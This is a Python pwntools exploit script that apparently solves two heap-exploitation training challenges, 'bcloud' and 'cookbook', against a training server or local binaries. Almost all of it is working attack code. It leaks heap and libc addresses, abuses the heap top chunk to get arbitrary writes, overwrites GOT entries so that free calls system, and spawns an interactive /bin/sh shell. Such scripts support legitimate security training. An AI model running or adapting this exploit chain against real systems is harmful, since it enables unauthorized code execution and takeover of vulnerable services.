import argparse
from pwn import *

parser = argparse.ArgumentParser()
parser.add_argument("binary", type=str)
parser.add_argument("--remote", "-r", action="store_true")

context.terminal = ["exo-open", "--launch", "TerminalEmulator"]


class switcher:
    @classmethod
    def indirect(cls, args):
        method = getattr(cls, args.binary, lambda: "invalid")
        return method(args)

    @classmethod
    def bcloud(cls, args):
        if args.remote:
            r = remote("training.jinblack.it", 2016)
        else:
            r = process("./" + args.binary)  # , env={"LD_PRELOAD": "./libc-2.27.so"})
            gdb.attach(
                r,
                """
            b * 0x08048804
            c
            """,
            )
            input("Press any key to continue.")

        def new_note(size, data):
            r.sendline(b"1")
            r.recvuntil(b"Input the length of the note content:\n")
            r.sendline(b"%d" % size)
            r.recvuntil(b"Input the content:\n")
            r.send(data)
            if len(data) < size:
                r.send(b"\n")
            r.recvuntil("--->>\n")

        def edit(note_id, data):
            r.sendline(b"3")
            r.recvuntil(b"Input the id:\n")
            r.sendline(b"%d" % note_id)
            r.recvuntil(b"Input the new content:\n")
            r.sendline(data)
            r.recvuntil("--->>\n")

        def arbitrary_write(address, data):
            edit(1, address)
            edit(4, data)

        r.recvuntil("name:\n")

        r.send(b"A" * 0x40)
        leak = u32(r.recvuntil("!")[:-1][-4:])
        print("[!] leak: 0x%08x" % leak)

        r.recvuntil("Org:\n")
        r.send(b"B" * 0x40)
        r.recvuntil("Host:\n")
        r.send(b"\xff" * 0x40)

        top_chunk = leak + 0xF8
        print("[!] top_chunk: 0x%08x" % top_chunk)

        target = 0x0804B120  # note_addresses_array
        big_size = (target - top_chunk - 4) & 0xFFFFFFFF
        print("[!] big_size: 0x%08x" % u32(p32(big_size, signed=False), signed=True))

        r.sendline(b"1")
        r.recvuntil(b"Input the length of the note content:\n")
        r.sendline(b"%d" % u32(p32(big_size, signed=False), signed=True))
        r.recvuntil(b"Input the content:\n")
        r.sendline("A")
        r.recvuntil("--->>\n")

        puts_plt = 0x08048520
        free_got = 0x0804B014

        new_note(50, "")
        new_note(4, "")
        new_note(4, "")
        new_note(4, "")
        new_note(4, "")

        note_slot_5 = 0x804B134
        read_got = 0x0804B00C

        arbitrary_write(p32(free_got), p32(puts_plt))
        arbitrary_write(p32(note_slot_5), p32(read_got))

        r.sendline(b"4")
        r.sendline(b"5")
        r.recvuntil(b"id:\n")
        read_libc = u32(r.recv(4))
        r.recvuntil("--->>\n")
        print("[!] read@libc: 0x%04x" % read_libc)

        libc = ELF("./libc-2.27.so")
        libc.address = read_libc - libc.symbols["read"]
        system_libc = libc.symbols["system"]
        print("[!] system@libc: 0x%04x" % system_libc)

        new_note(8, b"/bin/sh\x00")
        targetValue = 0x804B1B0
        note_slot_6 = 0x804B138
        arbitrary_write(p32(free_got), p32(system_libc))
        arbitrary_write(p32(note_slot_6), p32(targetValue))

        r.sendline(b"4")
        r.sendline(b"6")

        r.interactive()

    @classmethod
    def cookbook(cls, args):
        if args.remote:
            r = remote("training.jinblack.it", 2017)
        else:
            r = process("./" + args.binary, env={"LD_PRELOAD": "./libc-2.27.so"})
            gdb.attach(
                r,
                """
            c
            """,
            )
            input("Press any key to continue.")

        r.recvuntil("name?\n")
        r.sendline(b"")

        r.recvuntil("[q]uit\n")
        r.sendline(b"c")

        r.recvuntil("[q]uit\n")
        r.sendline(b"n")

        r.recvuntil("[q]uit\n")
        r.sendline(b"a")
        r.recvuntil("add? ")
        r.sendline(b"basil")
        r.recvuntil("hex): ")
        r.sendline(b"0")

        r.recvuntil("[q]uit\n")
        r.sendline(b"d")

        r.recvuntil("[q]uit\n")
        r.sendline(b"q")

        r.recvuntil("[q]uit\n")
        r.sendline(b"a")

        r.recvuntil("quit)?\n")
        r.sendline(b"n")

        r.recvuntil("quit)?\n")
        r.sendline(b"e")

        r.recvuntil("quit)?\n")
        r.sendline(b"q")

        r.recvuntil("[q]uit\n")
        r.sendline(b"l")

        for _ in range(9):
            r.recvuntil("calories: ")
        value = r.recv(10)
        system_libc = (int(value) & 0xFFFFFFFF) - 0x19B7D8
        print("[!] system@libc: 0x%04x" % system_libc)

        r.recvuntil("[q]uit\n")
        r.sendline(b"g")
        r.recvuntil("!) : ")
        r.sendline(b"0x20")
        r.sendline(b"")

        r.recvuntil("[q]uit\n")
        r.sendline(b"g")
        r.recvuntil("!) : ")
        r.sendline(b"0x90")
        r.send(b"A" * 0x8F)

        r.recvuntil("[q]uit\n")
        r.sendline(b"R")

        r.recvuntil("[q]uit\n")
        r.sendline(b"a")

        r.recvuntil("quit)?\n")
        r.sendline(b"n")

        r.recvuntil("quit)?\n")
        r.sendline(b"l")
        r.recvuntil("name: ")
        r.recv(132)
        heap_addr = u32(r.recv(4))
        print("[!] heap_addr: 0x%08x" % heap_addr)
        top_chunk = heap_addr + 0x34C
        print("[!] top_chunk: 0x%08x" % top_chunk)

        r.recvuntil("quit)?\n")
        r.sendline(b"q")

        r.recvuntil("[q]uit\n")
        r.sendline(b"c")

        r.recvuntil("[q]uit\n")
        r.sendline(b"n")

        r.recvuntil("[q]uit\n")
        r.sendline(b"g")
        r.sendline(b"\xff" * 0x384)

        r.recvuntil("[q]uit\n")
        r.sendline(b"q")

        target = 0x0804D008
        big_size = (target - (top_chunk + 0x410)) & 0xFFFFFFFF
        print("[!] big_size: 0x%08x" % big_size)

        r.recvuntil("[q]uit\n")
        r.sendline(b"g")
        r.recvuntil("!) : ")
        r.sendline("0x%08x" % big_size)

        printf = p32(0x08048516)
        strcspn = p32(0x08048526)
        system_libc = p32(system_libc)

        for _ in range(5):
            r.recvuntil("[q]uit\n")
            r.sendline(b"g")
            r.recvuntil("!) : ")
            r.sendline(b"0x90")
            r.sendline(printf + strcspn + system_libc)

        r.recvuntil("[q]uit\n")
        r.sendline(b"g")
        r.recvuntil("!) : ")
        r.sendline(b"0x90")
        r.send(b"/bin/sh\00")

        r.sendline(b"R")
        r.sendline(b"R")

        r.interactive()


switcher.indirect(parser.parse_args())
